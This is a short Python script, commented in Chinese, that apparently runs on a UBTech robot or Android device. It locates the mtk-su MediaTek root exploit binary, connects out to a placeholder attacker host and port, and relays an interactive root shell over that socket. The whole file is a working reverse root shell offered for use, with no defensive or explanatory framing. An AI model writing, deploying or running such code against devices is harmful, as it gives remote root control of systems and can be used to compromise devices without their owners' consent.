# sig_rootsh.py — 机器人侧：起 mtk-su 交互 root shell 并原样转发（经 8801 上传运行）
import os
import select
import socket
import subprocess
import time

LHOST = "__LHOST__"
LPORT = __LPORT__

CANDIDATES = ["/data/local/sig/mtk-su",
              "/data/data/com.termux/files/home/mtk-su",
              "/data/data/com.ubtechinc.mini.speechactor/mtk-su"]

s = socket.create_connection((LHOST, LPORT), timeout=30)
s.settimeout(None)
mtksu = None
for p in CANDIDATES:
    if os.path.exists(p):
        mtksu = p
        break
if mtksu is None:
    s.sendall(b"ERR: mtk-su not found\n")
    s.close()
    raise SystemExit(1)

p = subprocess.Popen([mtksu], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                     stderr=subprocess.STDOUT, bufsize=0)
s.sendall(b"ROOTSHELL-READY\n")
alive = True
while alive:
    r, _, _ = select.select([s, p.stdout], [], [], 1.0)
    if p.poll() is not None and not r:
        break
    for fd in r:
        try:
            data = os.read(fd.fileno() if hasattr(fd, "fileno") else fd, 65536)
        except OSError:
            data = b""
        if not data:
            alive = False
            break
        try:
            if fd is s:
                p.stdin.write(data)
                p.stdin.flush()
            else:
                s.sendall(data)
        except OSError:
            alive = False
            break
try:
    p.kill()
except Exception:
    pass
s.close()
